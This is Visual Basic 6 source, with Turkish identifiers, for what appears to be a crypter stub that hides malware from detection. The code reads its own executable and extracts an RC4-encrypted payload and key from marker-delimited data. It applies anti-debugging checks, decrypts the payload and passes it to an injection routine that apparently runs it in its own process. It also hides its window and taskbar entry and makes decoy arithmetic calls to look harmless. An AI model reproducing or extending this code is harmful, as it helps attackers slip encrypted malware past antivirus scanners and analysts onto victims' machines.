VERSION 5.00
Begin VB.Form f 
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   735
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   1110
   Icon            =   "frm.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   735
   ScaleWidth      =   1110
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer t2 
      Interval        =   1
      Left            =   600
      Top             =   120
   End
   Begin VB.Timer t1 
      Interval        =   1000
      Left            =   120
      Top             =   120
   End
End
Attribute VB_Name = "f"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim resbytes() As Byte
Dim benkimim As String
Dim dosyano As Integer
Dim Buffer() As Byte
Dim sBuffer As String
Dim sKEY As String
Dim sTmp() As String
Dim dbgcntrl() As String
Dim alan1 As Long
Dim alan2 As Long
Dim araveri As String

Sub beniparcala(dosya As String)
    dosyano = FreeFile
    
    Open dosya For Binary As #1
        sBuffer = Space(LOF(1))
        Get #1, , sBuffer
    Close #1

    sTmp = Split(sBuffer, "9876543210")
    sBuffer = sTmp(1)
    sKEY = sTmp(2)
 
    For dosyano = 0 To 6 'antidbg
        If sTmp(3 + dosyano) <> "0" Then koru (dosyano)
    Next
    
    sBuffer = RC4(CStr(sBuffer), CStr(sKEY))
End Sub

Sub kendimdecalistir(giris() As Byte, neyim As String)
   Call bulastir(ThisExe, giris())
End Sub

Public Function stringibaytyap(ByVal sStr As String) As Byte()
Dim I As Long
Dim Buffer() As Byte
    ReDim Buffer(Len(sStr) - 1)
    For I = 1 To Len(sStr)
        Buffer(I - 1) = Asc(Mid(sStr, I, 1))
    Next I
    stringibaytyap = Buffer()
End Function

Private Sub Form_Initialize()
    Me.Visible = False
    ikisayitopla 10, 30
    sayiciftmitekmi
End Sub

Private Sub Form_Load()
Me.Visible = False
f.Caption = customerinfo
End Sub

Private Sub t1_Timer()
    benkimim = App.Path & "\" & App.EXEName & ".exe"
    beniparcala benkimim
    kendimdecalistir stringibaytyap(sBuffer), benkimim
    benikapat
End Sub

Private Sub t2_Timer()
Me.Hide
App.TaskVisible = False
Me.Visible = False
End Sub

Sub benikapat()
t1.Enabled = False
t2.Enabled = False
End
End Sub
